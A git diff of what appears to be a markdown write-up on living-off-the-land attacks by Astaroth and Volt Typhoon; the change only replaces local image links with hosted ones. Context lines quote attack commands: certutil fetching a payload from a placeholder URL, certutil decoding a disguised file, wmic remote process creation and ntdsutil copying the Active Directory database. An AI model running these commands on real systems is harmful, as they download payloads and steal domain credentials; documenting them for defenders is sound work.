@@ -43,7 +43,7 @@ certutil.exe -urlcache -f "<URL/Payload>" "%Temp%\demo.exe"
 certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z %PUBLIC%\Libraries\temporary\falxconxrenwb.~
 ```
 
-![Astaroth](image.png)
+![image](https://github.com/user-attachments/assets/f3ba69a1-f9bf-4300-9b03-551917f9875f)
 > Astaroth “living-off-the-land” attack chain showing multiple legitimate tools abused
 ---
 
@@ -72,6 +72,7 @@ wmic /node: /user: /password: process call create "cmd.exe /c mkdir C:\Windows\T
 cmd.exe /c ntdsutil "as i ntds" ifm "create full C:\Windows\Temp\pro" q q
 ```
 
-![alt text](image-1.png)
+![image](https://github.com/user-attachments/assets/6ed56eeb-f118-46d7-997a-4f0e58fd20af)
+
 >  Volt Typhoon attack diagram
 ---
